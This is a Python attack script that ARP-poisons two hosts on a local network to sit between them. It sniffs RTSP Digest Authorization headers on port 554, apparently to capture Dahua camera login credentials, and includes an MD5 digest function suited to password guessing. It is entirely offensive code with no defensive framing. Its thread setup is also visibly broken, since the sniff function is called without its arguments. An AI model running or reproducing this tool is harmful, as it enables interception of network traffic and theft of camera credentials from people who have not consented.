from scapy.layers.l2 import getmacbyip, get_if_addr, get_if_hwaddr, sendp, Ether, ARP
from scapy.layers.inet import TCP
from scapy.all import sniff, conf
from threading import Thread
import hashlib
import sys


def arp_poison(iface, iface_mac, target_ip, target_mac, source_ip):
    """
    Poison the ARP tables of a target with the MAC of the device running
    this script. It uses the specified network interface and its MAC and
    sends an ARP packet every second to the target to trick it into
    thinking this device's IP is the source IP.
    """

    packet = Ether() / ARP()
    packet[Ether].src = iface_mac
    packet[ARP].hwsrc = iface_mac
    packet[ARP].psrc = source_ip
    packet[ARP].hwdst = target_mac
    packet[ARP].pdst = target_ip
    sendp(packet, iface=iface, inter=1, loop=1)


def dahua_rtsp_hash(username, realm, password, method, uri, nonce):
    """
    Generate the 'response' hash from session parameters and a password. Uses
    HTTP Digest access authorization with MD5 to generate a hash. For more info,
    see: https://en.wikipedia.org/wiki/Digest_access_authentication

    The parameters follow the respective field names in Dahua's Authorization
    headers when connecting over RTSP. The method parameter refers to the RTSP
    directive used (e.g. OPTION, DESCRIBE, PLAY, etc.)
    """

    ha1_str = username + ":" + realm + ":" + password
    ha2_str = method + ":" + uri

    ha1 = hashlib.md5(ha1_str.encode())
    ha2 = hashlib.md5(ha2_str.encode())

    response_str = ha1.hexdigest() + ":" + nonce + ":" + ha2.hexdigest()
    response = hashlib.md5(response_str.encode())

    return response.hexdigest()


sniff_result = {}


def sniff_rtsp_authorization(source_ip, target_ip):
    """
    Sniff packets coming through the device running the script. It filters out
    RTSP packets originating from a certain IP and going to a certain other.

    Sniffed packets are filtered on whether they have a (populated) Authorization
    header, which is the only case in which they are useful in this tool. When one
    has been found, the dictionary of Authorization fields is written to sniff_result
    and the function exits the current thread.
    """

    def read_packet(pkt):
        global sniff_result
        if pkt and pkt[TCP] and pkt[TCP].payload:
            payload = "".join(map(chr, bytes(pkt[TCP].payload)))
            authorization = [line for line in payload.split(
                "\n") if "Authorization" in line]
            if len(authorization) > 0:
                authorization = authorization[0].removeprefix(
                    "Authorization: Digest ")
                field_dict = {field.partition("=")[0]: field.partition("=")[2].strip(
                    "\r").strip("\"") for field in authorization.split(", ")}
                if field_dict["username"] != "":
                    field_dict["method"] = payload.split("\n")[0].split(" ")[0]
                    sniff_result = field_dict
                    sys.exit()

    filter = f'src host {source_ip} && dst host {target_ip} && tcp dst port 554'
    sniff(filter=filter, iface=conf.iface, prn=read_packet)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Incorrect number of arguments!")
        exit(1)

    victim_ip = sys.argv[1]
    victim_mac = getmacbyip(victim_ip)

    spoof_ip = sys.argv[2]
    spoof_mac = getmacbyip(spoof_ip)

    attacker_iface = conf.iface
    attacker_ip = get_if_addr(attacker_iface)
    attacker_mac = get_if_hwaddr(attacker_iface)

    def poison_victim():
        arp_poison(attacker_iface, attacker_mac,
                   victim_ip, victim_mac, spoof_ip)

    def poison_spoof():
        arp_poison(attacker_iface, attacker_mac,
                   spoof_ip, spoof_mac, victim_ip)

    Thread(target=poison_victim).start()
    Thread(target=poison_spoof).start()

    def sniff():
        sniff_rtsp_authorization(victim_ip, spoof_ip)

    sniff_thread = Thread(target=sniff_rtsp_authorization)
    sniff_thread.start()
    sniff_thread.join()

    # Get the found authorization fields
    fields = sniff_result
    print(fields)
